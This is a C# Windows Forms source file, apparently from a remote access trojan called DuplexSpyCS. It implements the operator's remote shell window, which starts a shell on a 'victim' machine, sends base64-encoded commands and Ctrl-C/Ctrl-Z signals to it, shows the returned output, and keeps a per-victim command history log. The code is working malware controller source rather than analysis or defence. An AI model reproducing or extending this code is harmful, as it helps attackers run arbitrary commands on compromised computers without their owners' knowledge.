using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace DuplexSpyCS
{
    public partial class frmShell : Form
    {
        public clsVictim v;
        private int idx_cmdPrompt;
        private int idx_previous_sel;

        private string[] last_pattern;

        public string init_path;

        public frmShell(clsVictim victim, string init_path = ".")
        {
            InitializeComponent();

            this.init_path = init_path;
            v = victim;
        }

        private void tbSelectLast()
        {
            textBox2.Focus();
            textBox2.SelectionStart = textBox2.Text.Length;
            textBox2.SelectionLength = 0;
        }

        public void WriteOutput(string output)
        {
            Invoke(new Action(() =>
            {
                richTextBox1.AppendText(clsCrypto.b64D2Str(output));
                idx_cmdPrompt = richTextBox1.Text.Length;
                richTextBox1.SelectionStart = idx_cmdPrompt;
                richTextBox1.ScrollToCaret();

                textBox2.Focus();
            }));
        }
        public void ProcessTab(string pattern)
        {
            Invoke(new Action(() =>
            {
                richTextBox1.Text = richTextBox1.Text.Substring(0, idx_cmdPrompt);
                richTextBox1.AppendText(pattern);
            }));
        }

        //Send cmd command
        private void ExecCmd(string cmd)
        {
            v.SendCommand($"shell|cmd|{clsCrypto.b64E2Str(cmd)}");
        }

        void setup()
        {
            string exec = clsStore.ini_manager.Read("Shell", "exec");
            textBox1.Text = exec;
            richTextBox1.ReadOnly = true;
            v.SendCommand($"shell|start|{clsCrypto.b64E2Str(exec)}|{clsCrypto.b64E2Str(init_path)}");
        }

        private void frmShell_Load(object sender, EventArgs e)
        {
            setup();
        }

        private void richTextBox1_KeyDown(object sender, KeyEventArgs e)
        {
            /*
            int rb_pos = richTextBox1.SelectionStart;
            if (e.KeyCode == Keys.Enter || e.KeyCode == Keys.Return || e.KeyCode == Keys.Tab)
            {
                int idx_current = richTextBox1.Text.Length;
                string cmd = richTextBox1.Text[idx_cmdPrompt..idx_current];

                bool tab_complete = e.KeyCode == Keys.Tab && rb_pos == richTextBox1.Text.Length;
                if (tab_complete)
                {
                    e.Handled = true;
                    string[] s = cmd.Split(' ');
                    if (last_pattern != null && string.Join(" ", s[0..(s.Length - 1)]) == string.Join(" ", last_pattern[0..(last_pattern.Length - 1)]))
                    {
                        cmd = string.Join(" ", last_pattern);
                    }
                    else
                    {
                        last_pattern = s;
                    }
                }

                v.encSend(2, 0, $"shell|{(tab_complete ? "tab" : "cmd")}|" + Crypto.b64E2Str(cmd));
            }
            else if (e.KeyCode == Keys.Delete || e.KeyCode == Keys.Back)
            {
                if (rb_pos == idx_cmdPrompt)
                {
                    e.Handled = true;
                    return;
                }
            }
            */
        }

        private void richTextBox1_KeyPress(object sender, KeyPressEventArgs e)
        {

        }

        private void richTextBox1_SelectionChanged(object sender, EventArgs e)
        {
            int rb_pos = richTextBox1.SelectionStart;
            if (rb_pos < idx_cmdPrompt)
            {
                richTextBox1.SelectionStart = idx_previous_sel;
            }
            else
            {
                idx_previous_sel = rb_pos;
            }
        }

        //Start exec
        private void button1_Click(object sender, EventArgs e)
        {
            v.SendCommand($"shell|start|{clsCrypto.b64E2Str(textBox1.Text)}|{clsCrypto.b64E2Str(".")}");
        }

        //Save output
        private void toolStripMenuItem1_Click(object sender, EventArgs e)
        {
            SaveFileDialog sfd = new SaveFileDialog();
            sfd.FileName = "output_" + clsTools.GenerateFileName("txt");
            if (sfd.ShowDialog() == DialogResult.OK)
            {
                try
                {
                    File.WriteAllText(sfd.FileName, richTextBox1.Text);
                    MessageBox.Show("Write shell output successfully:\n" + sfd.FileName, "OK", MessageBoxButtons.OK, MessageBoxIcon.Information);
                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
            }
        }

        private void toolStripButton1_Click(object sender, EventArgs e)
        {
            new frmBoxHelper("Function\\Shell").Show();
        }

        private void textBox2_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.Modifiers == Keys.Control)
            {
                if (e.KeyCode == Keys.C) //Interrupts a running process.
                {
                    v.SendCommand($"shell|ctrl|CtrlC");
                }
                else if (e.KeyCode == Keys.Z) //Send EOF
                {
                    v.SendCommand($"shell|ctrl|CtrlZ");
                }
            }
            else
            {
                if (e.KeyCode == Keys.Enter)
                {
                    ExecCmd(textBox2.Text);

                    if (string.IsNullOrEmpty(textBox2.Text))
                        return;

                    string file = Path.Combine(v.dir_victim, "shell.log");

                    if (!File.Exists(file))
                        File.WriteAllText(file, string.Empty);

                    try
                    {
                        using (StreamWriter sw = new StreamWriter(file, append: true))
                        {
                            sw.WriteLine(textBox2.Text);
                        }

                        string[] lines = File.ReadAllLines(file);
                        textBox2.Tag = lines.Length;
                    }
                    catch (Exception ex)
                    {
                        MessageBox.Show(ex.Message, ex.GetType().Name, MessageBoxButtons.OK, MessageBoxIcon.Error);
                    }

                    textBox2.Clear();
                }
                else if (e.KeyCode == Keys.Tab)
                {
                    //todo: auto complete
                }

                #region History command
                /* For the single line textbox,
                 * the up and down arrow key will change the selection to left and right.
                 * To avoid this, use e.Handled = true to cancel the key down action.
                 */

                else if (e.KeyCode == Keys.Up)
                {
                    string szLogFile = Path.Combine(v.dir_victim, "shell.log");
                    if (!File.Exists(szLogFile))
                        return;

                    string[] lines = File.ReadAllLines(szLogFile);
                    if (textBox2.Tag == null)
                        textBox2.Tag = lines.Length;

                    int nIdx = (int)textBox2.Tag;
                    int nNewIdx = nIdx - 1;
                    if (nNewIdx >= 0)
                    {
                        textBox2.Text = lines[nNewIdx];
                        textBox2.Tag = nNewIdx;
                    }

                    tbSelectLast();
                    e.Handled = true;
                }
                else if (e.KeyCode == Keys.Down)
                {
                    string szLogFile = Path.Combine(v.dir_victim, "shell.log");
                    if (!File.Exists(szLogFile))
                        return;

                    string[] lines = File.ReadAllLines(szLogFile);
                    if (textBox2.Tag == null)
                        textBox2.Tag = lines.Length;

                    int nIdx = (int)textBox2.Tag;
                    if (nIdx < lines.Length)
                    {
                        textBox2.Text = lines[nIdx];
                        textBox2.Tag = nIdx + 1;
                    }

                    tbSelectLast();
                    e.Handled = true;
                }

                #endregion
            }
        }

        //Execute
        private void button2_Click(object sender, EventArgs e)
        {
            ExecCmd(textBox2.Text);
            textBox2.Clear();
        }

        //Goto - Top
        private void toolStripMenuItem4_Click(object sender, EventArgs e)
        {
            richTextBox1.SelectionStart = 0;
            richTextBox1.SelectionLength = 0;
            richTextBox1.ScrollToCaret();
        }
        //Goto - Bottom
        private void toolStripMenuItem5_Click(object sender, EventArgs e)
        {
            richTextBox1.SelectionStart = richTextBox1.Text.Length;
            richTextBox1.ScrollToCaret();
        }
        //Clear output
        private void toolStripMenuItem3_Click(object sender, EventArgs e)
        {
            richTextBox1.Clear();
        }

        private void toolStripButton2_Click(object sender, EventArgs e)
        {
            new frmSetting("Shell").ShowDialog();
        }

        //History - File
        private void toolStripMenuItem6_Click(object sender, EventArgs e)
        {
            string szFileName = "shell.log";
            szFileName = Path.Combine(new string[]
            {
                v.dir_victim,
                szFileName,
            });

            if (!File.Exists(szFileName))
            {
                MessageBox.Show("Cannot find file: " + szFileName, "ERROR", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }

            ProcessStartInfo psi = new ProcessStartInfo
            {
                FileName = "notepad.exe",
                Arguments = $"\"{szFileName}\"",
            };
            Process p = new Process();
            p.StartInfo = psi;
            p.Start();
            p.WaitForExit();
        }
        //History - Clear
        private void toolStripMenuItem7_Click(object sender, EventArgs e)
        {
            string szFileName = "shell.log";
            szFileName = Path.Combine(new string[]
            {
                v.dir_victim,
                szFileName,
            });

            if (!File.Exists(szFileName))
            {
                MessageBox.Show("Cannot find file: " + szFileName, "ERROR", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }

            File.WriteAllText(szFileName, string.Empty);
        }

        private void frmShell_FormClosed(object sender, FormClosedEventArgs e)
        {
            v.fnSendCommand(new string[]
            {
                "shell",
                "stop",
            });
        }
    }
}
